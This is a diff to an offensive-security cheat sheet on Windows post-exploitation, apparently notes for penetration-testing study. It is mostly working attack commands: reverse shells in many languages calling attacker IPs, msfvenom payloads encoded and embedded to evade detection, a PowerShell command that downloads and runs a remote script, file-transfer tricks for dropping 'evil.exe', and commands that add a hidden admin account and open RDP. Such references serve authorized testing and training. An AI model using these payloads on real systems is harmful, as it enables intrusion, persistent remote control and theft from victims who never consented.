@@ -1,4 +1,184 @@
+github# Reverse shell
+## Netcat Traditional
+```shell
+nc -e cmd.exe 10.0.0.1 4242
+```
+## Powershell
+```powershell
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+```powershell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+```powershell
+powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
+```
+## Perl
+```perl
+perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 
+# To confirm on windows: 
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+```
+## Python
+Python2:
+```powershell
+python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
+```
+Python3:
+```powershell
+python.exe -c "import socket,os,threading,subprocess as sp;p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect(('10.0.0.1',4242));threading.Thread(target=exec,args=(\"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\",globals()),daemon=True).start();threading.Thread(target=exec,args=(\"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\",globals())).start()"
+```
+## Ruby
+```ruby
+ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+# To confirm on windows: 
+ruby -rsocket -e'exit if fork;c=TCPSocket.new("10.0.0.1","4242");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
+```
+## Java
+```java
+String host="127.0.0.1";
+int port=4444;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
+### Java Alternative
+**NOTE**: This is more stealthy
+```java
+Thread thread = new Thread(){
+    public void run(){
+        // Reverse shell here
+    }
+}
+thread.start();
+```
+## Lua
+```powershell
+lua5.1 -e 'local host, port = "10.0.0.1", 4242 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
+```
+## Groovy
+by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NOTE: Java reverse shell also work for Groovy
+```java
+String host="10.0.0.1";
+int port=4242;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
+### Groovy Alternative
+**NOTE**: This is more stealthy
+```java
+Thread.start {
+    // Reverse shell here
+}
+```
+## Dart
+```java
+import 'dart:io';
+import 'dart:convert';
+
+main() {
+  Socket.connect("10.0.0.1", 4242).then((socket) {
+    socket.listen((data) {
+      Process.start('powershell.exe', []).then((Process process) {
+        process.stdin.writeln(new String.fromCharCodes(data).trim());
+        process.stdout
+          .transform(utf8.decoder)
+          .listen((output) { socket.write(output); });
+      });
+    },
+    onDone: () {
+      socket.destroy();
+    });
+  });
+}
+```
+## MsfVenom
+```
+# List formats
+msfvenom --list formats
+# List payloads
+msfvenom --payload --list-options | grep windows
+```
+### BAT
+mostly used with **JuicyPotato** exploit.
+```
+msfvenom -p cmd/windows/reverse_powershell lhost=10.10.12.15 lport=4444 > shell.bat
+```
+### EXE
+Staged reverse TCP:
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
+```
+Non-Staged reverse TCP:
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f exe -o non_staged.exe
+```
+64bit payload:
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -o shell.exe
+```
+Embedded payload:
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
+# Windows reverse shell embedded into plink  
+```
+### Powershell
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -i 9 -f psh -o shell.ps1
+```
+### Sh
+```
+msfvenom -p cmd/unix/reverse_bash LHOST="10.0.0.1" LPORT=4242 -f raw > shell.sh
+```
+### ELF
+```
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f elf > shell.elf
+```
+### Python
+```
+msfvenom -p cmd/unix/reverse_python LHOST="10.0.0.1" LPORT=4242 -f raw > shell.py
+```
+### Perl
+```
+msfvenom -p cmd/unix/reverse_perl LHOST="10.0.0.1" LPORT=4242 -f raw > shell.pl
+```
+### PHP
+```
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f raw -o shell.php
+# Or this crazy syntax
+msfvenom -p php/meterpreter_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '
+```
+### ASP
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f asp > shell.asp
+```
+### ASPX
+```
+msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.16.3 LPORT=4444 > shell.aspx
+```
+### JSP
+```
+msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.jsp
+```
+### Java WAR
+```
+msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f war > shell.war
+```
+### MSI
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f msi -o filename.msi
+# Or this crazy syntax
+msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST="10.0.0.1" LPORT=4242 -f msi -o filename.msi
+```
+Executing msi file:
+```
+msiexec /quiet /qn /i C:\\Users\\filename.msi
+```
+### MACHO
+```
+msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f macho > shell.macho
+```
 # Download and execute methods
 ## Downloaded files location 
 ```
@@ -28,6 +208,10 @@ C:\Windows\System32\fxstmp
 C:\Windows\SysWOW64\fxstmp
 ```
 ## HTTP
+### Wget
+#### Downloading files
+### Curl
+#### Downloading files
 ### Cmd
 #### Running a script from remote host
 ```
@@ -51,7 +235,10 @@ echo $webclient = New-Object System.Net.WebClient > wget.ps1
 echo $url = "http://10.0.0.1:4444/file.exe" >> wget.ps1
 echo $output = "C:\Windows\Temp\file.exe" >> wget.ps1
 echo $webclient.DownloadFile($url,$output) >> wget.ps1
-powershell wget.ps1
+# Execute the script with
+powershell wget.ps1 
+# or the crazy syntax above  
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
 ```
 In PowerShell 3 and above:
 ```
@@ -133,6 +320,35 @@ echo End if >> downloadfile.vbs
 echo Set objXMLHTTP = Nothing >> downloadfile.vbs
 cscript downloadfile.vbs
 ```
+or
+```
+echo strUrl = WScript.Arguments.Item(0) > wget.vbs
+echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
+echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
+echo Err.Clear >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
+echo http.Open "GET",strURL,False >> wget.vbs
+echo http.Send >> wget.vbs
+echo varByteArray = http.ResponseBody >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
+echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
+echo strData = "" >> wget.vbs
+echo strBuffer = "" >> wget.vbs
+echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
+echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
+echo Next >> wget.vbs
+echo ts.Close >> wget.vbs
+cscript wget.vbs http://192.168.10.5/evil.exe evil.exe
+```
 #### Running a script from remote host
 ```
 cscript //E:jscript \\webdavserver\folder\payload.txt
@@ -179,6 +395,18 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 ```
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
+### Debug.exe (Windows 32bits)
+This is a crazy technique that works on windows 32 bit machines. Basically the idea is to use the `debug.exe` program. It is used to inspect binaries, like a debugger. But it can also rebuild them from hex. So the idea is that we take a binaries, like `netcat`. And then disassemble it into hex, paste it into a file on the compromised machine, and then assemble it with `debug.exe`.
+
+`Debug.exe` can only assemble 64 kb. So we need to use files smaller than that. We can use upx to compress it even more. So let's do that:
+```
+upx -9 nc.exe
+```
+Now it only weights 29 kb. Perfect. So now let's disassemble it:
+```
+wine exe2bat.exe nc.exe nc.txt
+```
+Now we just copy-past the text into our windows-shell. And it will automatically create a file called nc.exe
 ## SMB
 ### Enable SMBv1 (client)
 
@@ -244,6 +472,20 @@ Then execute the commands in the file with the following command:
 ```
 ftp -A -s:ftp.txt
 ```
+### Downloading files (Authenticated)
+Create a text file with the commands you wish to use:
+```
+echo open 192.168.1.78 > ftp.txt
+echo USER asshat>> ftp.txt
+echo mysecretpassword>> ftp.txt
+echo bin >> ftp.txt
+echo GET test.exe >> ftp.txt
+echo bye >> ftp.txt
+```
+Then execute the commands in the file with the following command:
+```
+ftp -v -n -s:ftp.txt
+```
 ### Uploading files
 Create a text file with the commands you wish to use:
 ```
@@ -256,7 +498,7 @@ Then execute the commands in the file with the following command:
 ```
 ftp -A -s:ftp.txt
 ```
-### TFTP
+## TFTP
 ### Downloading files
 ```
 tftp -i 10.0.0.1 GET file.exe
@@ -266,12 +508,13 @@ tftp -i 10.0.0.1 GET file.exe
 tftp -i 10.0.0.1 PUT file.exe
 ```
 # Generate Malicious Executables
-## Malicious cmd
-### Run executable in backgroud
+## Malicious code
+### Cmd
+#### Run executable in backgroud
 ```
 start /B program
 ```
-### Add Admin & Enable RDP
+#### Add Admin & Enable RDP
 ```
 net user /add hacked Password1
 net localgroup administrators hacked /add
@@ -281,18 +524,8 @@ reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
 netsh firewall set service type = REMOTEDESKTOP mode = ENABLE scope = CUSTOM addresses = 10.0.0.1
 ```
-## Exe builder
-### MsfVenom
-#### Add admin
-\*Note: On x64 machine you should use bat2exe.bat to create 64 bit executable\*
-```
-1\. Open command prompt and type: msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o exploit.exe
-2\. Copy the generated file, exploit.exe, to the Windows VM.
-```
-### GCC
-Write and compile malicious exe file to add a user to the system as an admin
-#### Add admin
-##### Contents of adduser.c
+### C Code
+#### Addadmin.c
 ```
 #include <stdlib.h>
 
@@ -307,14 +540,25 @@ int main ()
 		return 0;
 }
 ```
-
-##### Compile adduser.c on kali
+## Exe builder
+### MsfVenom (cmd)
+\*Note: On x64 machine you should use bat2exe.bat to create 64 bit executable\*
 ```
-sudo i686-w64-mingw32-gcc adduser.c -o exploit.exe
+msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o exploit.exe
+```
+### GCC (C Code)
+Write and compile malicious exe files.
+For 32bit environment:
+```
+sudo i686-w64-mingw32-gcc exploit.c -o exploit32.exe
+```
+For 64bit environment:
+```
+sudo x86_64-w64-mingw32-gcc exploit.c -o exploit64.exe
 ```
 # Using credentials 
 
-## Winxe
+## Winexe
 ```
 winexe -U DOMAIN/username%password //10.10.10.10 cmd.exe
 ```
@@ -489,3 +733,9 @@ net use \\ordws01.cscou.lab /user:DOMAIN\username password C$
 [Tib3rius/Active-Directory-Exploitation-Cheat-Sheet: A cheat sheet that contains common enumeration and attack methods for Windows Active Directory. (github.com)](https://github.com/Tib3rius/Active-Directory-Exploitation-Cheat-Sheet#lateral-movement)
 
 [PayloadsAllTheThings/Windows - Download and Execute.md at master · swisskyrepo/PayloadsAllTheThings (github.com)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md)
+
+[Compiling the Exploit - OSCP Notes (gitbook.io)](https://gabb4r.gitbook.io/oscp-notes/exploitaion/compiling-the-exploit)
+[msfvenom - OSCP Notes (gitbook.io)](https://gabb4r.gitbook.io/oscp-notes/shell/msfvenom)
+
+[Transfering files on Windows · Total OSCP Guide (gitbooks.io)](https://sushant747.gitbooks.io/total-oscp-guide/content/transfering_files_to_windows.html)
+
